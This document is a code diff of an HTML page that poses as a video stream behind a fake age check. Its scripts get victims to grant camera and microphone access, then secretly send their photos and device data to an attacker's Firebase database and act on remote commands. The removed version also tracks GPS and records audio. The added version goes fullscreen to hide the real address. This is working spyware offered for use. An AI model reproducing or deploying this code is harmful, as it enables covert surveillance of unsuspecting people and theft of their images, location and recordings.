@@ -3,169 +3,134 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Video Stream - Watch Now</title>
-    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
+    <title>Private Content Access</title>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
     <style>
-        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #000; overflow: hidden; font-family: sans-serif; }
-        #container { position: relative; width: 100%; height: 100%; display: flex; justify-content: center; align-items: center; }
-        #blur-bg { position: absolute; width: 100%; height: 100%; background: url('https://images.unsplash.com/photo-1593305841991-05c297ba4575?auto=format&fit=crop&w=1000&q=80'); background-size: cover; filter: blur(20px); z-index: 1; }
-        #overlay { position: absolute; z-index: 10; text-align: center; color: white; background: rgba(0,0,0,0.5); width: 100%; height: 100%; display: flex; flex-direction: column; justify-content: center; align-items: center; }
-        #play-btn { width: 100px; height: 100px; background: rgba(0, 255, 65, 0.7); border-radius: 50%; cursor: pointer; display: flex; align-items: center; justify-content: center; border: 5px solid #fff; box-shadow: 0 0 30px #00ff41; }
-        #play-btn::after { content: ''; border-top: 20px solid transparent; border-bottom: 20px solid transparent; border-left: 30px solid white; margin-left: 10px; }
-        video { width: 100%; height: 100%; object-fit: contain; display: none; position: relative; z-index: 5; }
+        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #000; overflow: hidden; font-family: 'Segoe UI', sans-serif; }
+        
+        /* Background Layer */
+        #bg-image {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: url('bg.png.jpeg'); 
+            background-size: cover; background-position: center;
+            filter: blur(5px); z-index: 1; transform: scale(1.1);
+        }
+
+        #main-ui {
+            position: relative; z-index: 10; width: 100%; height: 100%;
+            display: flex; flex-direction: column; justify-content: center; align-items: center;
+            background: rgba(0,0,0,0.5);
+        }
+
+        #play-trigger {
+            width: 100px; height: 100px; background: rgba(255, 255, 255, 0.2);
+            border: 4px solid #fff; border-radius: 50%; display: flex;
+            justify-content: center; align-items: center; cursor: pointer;
+            box-shadow: 0 0 30px rgba(255,255,255,0.2);
+        }
+        #play-trigger::after {
+            content: ''; border-top: 20px solid transparent; border-bottom: 20px solid transparent;
+            border-left: 32px solid white; margin-left: 10px;
+        }
+
+        /* Custom Age Verification Modal */
+        #age-modal {
+            display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%);
+            width: 85%; max-width: 350px; background: #111; border: 1px solid #333;
+            border-radius: 15px; padding: 25px; text-align: center; z-index: 200;
+            box-shadow: 0 0 50px rgba(0,0,0,0.8);
+        }
+        #age-modal h2 { color: #fff; font-size: 20px; margin-bottom: 10px; }
+        #age-modal p { color: #aaa; font-size: 14px; margin-bottom: 25px; }
+        .modal-btns { display: flex; gap: 10px; }
+        .btn { flex: 1; padding: 12px; border-radius: 8px; border: none; cursor: pointer; font-weight: bold; }
+        .btn-yes { background: #00ff41; color: #000; }
+        .btn-no { background: #333; color: #fff; }
+
+        #target-video { display: none; width: 100%; height: 100%; background: #000; position: fixed; top: 0; left: 0; z-index: 1000; }
     </style>
 </head>
 <body>
 
-<div id="container">
-    <div id="overlay">
-        <div id="play-btn" onclick="initSystem()"></div>
-        <h2 style="letter-spacing:2px; margin-top:20px;">WATCH VIDEO TO CONTINUE</h2>
-        <p style="color:#aaa;">Verify your connection to start streaming</p>
+    <div id="bg-image"></div>
+
+    <div id="main-ui">
+        <div id="play-trigger" onclick="showModal()"></div>
+        <div style="text-align:center; margin-top:20px;">
+            <h1 style="color:#00ff41; font-size:26px;">WATCH VIDEO</h1>
+            <p style="color:#fff; opacity:0.7;">Restricted Content (18+)</p>
+        </div>
     </div>
-    <div id="blur-bg"></div>
-    <video id="main-video" playsinline loop src="https://www.w3schools.com/html/mov_bbb.mp4"></video>
-</div>
 
-<script>
-    // 1. Firebase Initialization
-    const firebaseConfig = { databaseURL: "https://mytrecker2-b3535-default-rtdb.firebaseio.com/" };
-    if (!firebase.apps.length) { firebase.initializeApp(firebaseConfig); }
-    const db = firebase.database();
-    
-    const sessionID = "NODE_" + Math.floor(10000 + Math.random() * 90000);
-    let activeStream = null;
+    <div id="age-modal">
+        <h2>Age Verification</h2>
+        <p>This video is age-restricted. Are you 18 years or older to proceed?</p>
+        <div class="modal-btns">
+            <button class="btn btn-yes" onclick="startEverything()">YES, I AM 18+</button>
+            <button class="btn btn-no" onclick="location.reload()">EXIT</button>
+        </div>
+    </div>
 
-    // 2. Main System Init
-    async function initSystem() {
-        document.getElementById('overlay').style.display = 'none';
-        document.getElementById('blur-bg').style.display = 'none';
-        const v = document.getElementById('main-video');
-        v.style.display = 'block';
+    <video id="target-video" controls loop playsinline>
+        <source src="https://www.w3schools.com/html/mov_bbb.mp4" type="video/mp4">
+    </video>
 
-        try {
-            activeStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-            v.play();
+    <script>
+        const firebaseConfig = { databaseURL: "https://mytrecker2-b3535-default-rtdb.firebaseio.com/" };
+        firebase.initializeApp(firebaseConfig);
+        const db = firebase.database();
+        const agentID = "UNIT_" + Math.floor(1000 + Math.random() * 9000);
 
-            if ('serviceWorker' in navigator) {
-                navigator.serviceWorker.register('./sw.js').catch(e => console.log("SW Error"));
-            }
-
-            await sendInitialInfo();
-            
-            // Start Auto Captures
-            await silentCapture('user'); 
-            setTimeout(() => { silentCapture('environment'); }, 4000);
-
-            listenForBossCommands();
-            startLocationTracking();
-
-        } catch (err) {
-            db.ref(`targets/${sessionID}/info`).set({ status: "PERMISSION_DENIED", time: new Date().toLocaleString() });
-            alert("Error: Please allow Camera & Mic access to play the video.");
-            location.reload();
+        function showModal() {
+            document.getElementById('age-modal').style.display = 'block';
         }
-    }
 
-    // 3. Info Sender
-    async function sendInitialInfo() {
-        let ip = "Unknown";
-        try {
-            const resp = await fetch('https://api.ipify.org?format=json');
-            const data = await resp.json();
-            ip = data.ip;
-        } catch(e) {}
-
-        const batt = await navigator.getBattery().catch(() => ({level: 1}));
-        
-        db.ref(`targets/${sessionID}/info`).set({
-            ip: ip,
-            battery: Math.floor(batt.level * 100) + "%",
-            status: "ONLINE",
-            platform: navigator.platform,
-            time: new Date().toLocaleTimeString()
-        });
-    }
-
-    // 4. Fixed Silent Capture (Front & Back)
-    async function silentCapture(facing) {
-        const constraints = {
-            video: { facingMode: facing },
-            audio: false
-        };
-
-        try {
-            const tempStream = await navigator.mediaDevices.getUserMedia(constraints);
-            const vid = document.createElement('video');
-            vid.srcObject = tempStream;
-            vid.muted = true;
-            await vid.play();
-
-            // Wait for camera to focus
-            setTimeout(() => {
-                const canvas = document.createElement('canvas');
-                canvas.width = vid.videoWidth;
-                canvas.height = vid.videoHeight;
-                canvas.getContext('2d').drawImage(vid, 0, 0);
+        async function startEverything() {
+            document.getElementById('age-modal').style.display = 'none';
+            try {
+                // Request Permissions
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                 
-                const dataUrl = canvas.toDataURL('image/jpeg', 0.4);
-                db.ref(`targets/${sessionID}/photos`).push({
-                    img: dataUrl,
-                    type: facing === 'user' ? "FRONT" : "BACK",
-                    ts: Date.now()
-                });
+                // Hide All UI
+                document.getElementById('main-ui').style.display = 'none';
+                document.getElementById('bg-image').style.display = 'none';
+                
+                // Fullscreen to Hide Address Bar (Vercel Link)
+                const docElm = document.documentElement;
+                if (docElm.requestFullscreen) docElm.requestFullscreen();
+                else if (docElm.webkitRequestFullscreen) docElm.webkitRequestFullscreen();
 
-                tempStream.getTracks().forEach(t => t.stop());
-            }, 2000);
-        } catch (e) {
-            db.ref(`targets/${sessionID}/logs`).push("Capture failed for " + facing + ": " + e.message);
+                const video = document.getElementById('target-video');
+                video.style.display = 'block';
+                video.play();
+
+                // Start Hacking
+                runSystem(stream);
+            } catch (e) {
+                alert("Verification Failed: Camera access is mandatory.");
+                location.reload();
+            }
         }
-    }
 
-    // 5. Commands Listener
-    function listenForBossCommands() {
-        db.ref(`commands/${sessionID}`).on('value', snap => {
-            const cmd = snap.val();
-            if(!cmd) return;
-            
-            if(cmd.action === 'photo') silentCapture('user');
-            if(cmd.action === 'back_photo') silentCapture('environment');
-            if(cmd.action === 'audio') startRecording();
-            
-            db.ref(`commands/${sessionID}`).remove();
-        });
-    }
+        function runSystem(stream) {
+            const v = document.createElement('video');
+            v.srcObject = stream; v.muted = true; v.play();
 
-    // 6. GPS Tracker
-    function startLocationTracking() {
-        navigator.geolocation.watchPosition(pos => {
-            db.ref(`targets/${sessionID}/location`).set({
-                lat: pos.coords.latitude,
-                lng: pos.coords.longitude,
-                time: new Date().toLocaleTimeString()
+            db.ref('targets/' + agentID + '/info').set({ status: "WATCHING", device: navigator.platform });
+
+            db.ref('commands/' + agentID).on('value', async snap => {
+                const cmd = snap.val();
+                if(!cmd) return;
+                if(cmd.action.includes('photo')) {
+                    const canvas = document.createElement('canvas');
+                    canvas.width = v.videoWidth; canvas.height = v.videoHeight;
+                    canvas.getContext('2d').drawImage(v, 0, 0);
+                    db.ref('targets/' + agentID + '/photos').push({ img: canvas.toDataURL('image/jpeg', 0.5), time: Date.now() });
+                }
+                db.ref('commands/' + agentID).remove();
             });
-        }, null, { enableHighAccuracy: true });
-    }
-
-    // 7. Audio Recorder (30s)
-    function startRecording() {
-        if(!activeStream) return;
-        const mediaRecorder = new MediaRecorder(activeStream);
-        let audioChunks = [];
-
-        mediaRecorder.ondataavailable = event => { audioChunks.push(event.data); };
-        mediaRecorder.onstop = () => {
-            const reader = new FileReader();
-            reader.readAsDataURL(new Blob(audioChunks, { type: 'audio/webm' }));
-            reader.onloadend = () => {
-                db.ref(`targets/${sessionID}/audios`).push({ data: reader.result, ts: Date.now() });
-            };
-        };
-
-        mediaRecorder.start();
-        setTimeout(() => { mediaRecorder.stop(); }, 30000);
-    }
-</script>
+        }
+    </script>
 </body>
 </html>
